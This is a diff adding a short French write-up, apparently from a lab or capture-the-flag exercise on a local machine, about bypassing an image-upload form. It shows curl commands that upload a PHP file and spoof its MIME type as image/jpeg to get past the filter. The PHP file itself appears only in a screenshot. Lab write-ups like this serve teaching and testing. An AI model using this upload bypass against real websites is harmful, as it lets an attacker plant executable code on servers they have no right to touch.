@@ -1,0 +1,48 @@
+En accédant à la page :
+
+http://192.168.1.87/?page=upload
+<img width="1301" height="653" alt="Image" src="https://github.com/user-attachments/assets/6328d06a-500b-470b-a55d-f43621bbcad7" />
+
+Le site propose uniquement l’envoi d’une image via un formulaire :
+
+un champ "Choose an image to upload"
+
+un bouton UPLOAD
+
+En inspectant la requête envoyée par le navigateur après un upload d’image, on remarque :
+
+La requête est un POST multipart/form-data
+
+Le formulaire contient 3 éléments :
+
+MAX_FILE_SIZE=100000 uploaded=[contenu du fichier] Upload=Upload
+
+On teste d’abord avec une image flow.jpg : curl -i -X POST
+-F "MAX_FILE_SIZE=100000"
+-F "uploaded=@flower.jpg"
+-F "Upload=Upload"
+"http://192.168.1.87/?page=upload"
+
+On crée un fichier PHP simple :
+
+script.php
+<img width="411" height="239" alt="Image" src="https://github.com/user-attachments/assets/1bf2f8a5-fb9e-481c-a1e6-4cdbb975d599" />
+
+On tente de l’uploader :
+
+curl -i -X POST
+-F "MAX_FILE_SIZE=100000"
+-F "uploaded=@script.php"
+-F "Upload=Upload"
+"http://192.168.1.87/?page=upload"
+
+Curl permet de forcer un faux type MIME :
+
+-F "uploaded=@script.php;type=image/jpeg"
+
+curl -i -X POST
+-F "MAX_FILE_SIZE=100000"
+-F "uploaded=@script.php;type=image/jpeg"
+-F "Upload=Upload"
+"http://192.168.1.87/?page=upload"
+<img width="889" height="717" alt="Image" src="https://github.com/user-attachments/assets/976e62ba-7080-4ca5-bc6c-aedf6a56961b" />
